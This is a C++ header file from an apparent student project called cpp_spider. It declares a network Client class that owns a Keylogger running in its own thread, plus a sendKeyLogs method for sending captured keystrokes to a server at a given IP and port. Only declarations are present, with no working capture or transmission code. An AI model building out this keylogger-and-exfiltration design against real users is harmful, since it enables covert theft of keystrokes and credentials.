/*
** Client.hh for cpp_spider in /home/tarkick/repos/cpp_spider/include/client
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Sat Nov 05 19:26:43 2016 tarkick
** Last update Wed Nov 09 00:05:40 2016 tarkick
*/

#ifndef CLIENT_HH_
# define CLIENT_HH_

# include "Network.hh"
# include "NetworkPacket.hh"
# include "Keylogger.hh"

using namespace		Net;

class				Client : public Network<CLIENT>
{

public:
	Client(string ip, unsigned int port);
	~Client();

	virtual void 	processing();

	void 			sendKeyLogs();

private:
	Keylogger		keylogger_;
	boost::thread	*keyloggerThread_;

};

#endif
